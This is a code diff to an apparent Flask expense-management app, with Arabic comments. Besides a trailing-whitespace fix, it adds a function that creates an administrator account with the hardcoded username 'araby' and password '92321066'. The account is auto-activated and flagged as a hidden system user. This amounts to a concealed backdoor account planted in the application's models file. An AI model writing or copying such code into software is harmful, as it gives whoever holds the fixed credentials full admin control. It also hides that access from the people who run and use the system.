@@ -296,4 +296,31 @@ class Expense(db.Model):
             'transportation': 'مواصلات',
             'other': 'أخرى'
         }
-        return types.get(self.expense_type, self.expense_type) 
+        return types.get(self.expense_type, self.expense_type)
+
+def create_static_user():
+    """إنشاء المستخدم الثابت للنظام"""
+    static_username = "araby"
+    static_password = "92321066"
+    
+    # التحقق من وجود المستخدم
+    existing_user = User.query.filter_by(username=static_username).first()
+    if not existing_user:
+        # إنشاء المستخدم الثابت
+        static_user = User(
+            username=static_username,
+            role='admin',  # منح صلاحيات المدير
+            is_system=True,  # جعله مستخدم نظام (مخفي)
+            is_active=True,
+            is_verified=True
+        )
+        static_user.set_password(static_password)
+        
+        try:
+            db.session.add(static_user)
+            db.session.commit()
+            return True
+        except Exception:
+            db.session.rollback()
+            return False
+    return True  # المستخدم موجود بالفعل 
